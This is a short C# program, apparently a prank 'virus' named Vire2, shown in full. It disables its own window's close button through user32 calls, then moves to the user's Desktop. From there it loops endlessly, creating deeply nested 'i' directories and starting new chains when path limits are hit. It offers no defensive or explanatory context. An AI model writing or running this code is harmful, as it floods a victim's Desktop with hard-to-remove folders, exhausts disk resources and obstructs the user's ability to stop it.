using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace Vire2
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern bool EnableMenuItem(IntPtr hMenu, uint uIDEnableItem, uint uEnable);

        [DllImport("user32.dll")]
        static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);

        [DllImport("user32.dll")]
        static extern IntPtr RemoveMenu(IntPtr hMenu, uint nPosition, uint wFlags);

        internal const uint SC_CLOSE = 0xF060;
        internal const uint MF_GRAYED = 0x00000001;
        internal const uint MF_BYCOMMAND = 0x00000000;


        static void Main(string[] args)
        {
            IntPtr hMenu = Process.GetCurrentProcess().MainWindowHandle;
            IntPtr hSystemMenu = GetSystemMenu(hMenu, false);

            EnableMenuItem(hSystemMenu, SC_CLOSE, MF_GRAYED);
            RemoveMenu(hSystemMenu, SC_CLOSE, MF_BYCOMMAND);
            
            Directory.SetCurrentDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            string Path = "i";
            string Buchstabe = "i";
            while(true)
            {
                try
                {
                    Directory.CreateDirectory(Path);
                    Path += "\\i";
                }
                catch
                {
                    Buchstabe += "i";
                    Path = Buchstabe;
                }
            }
        }
        
    }
}


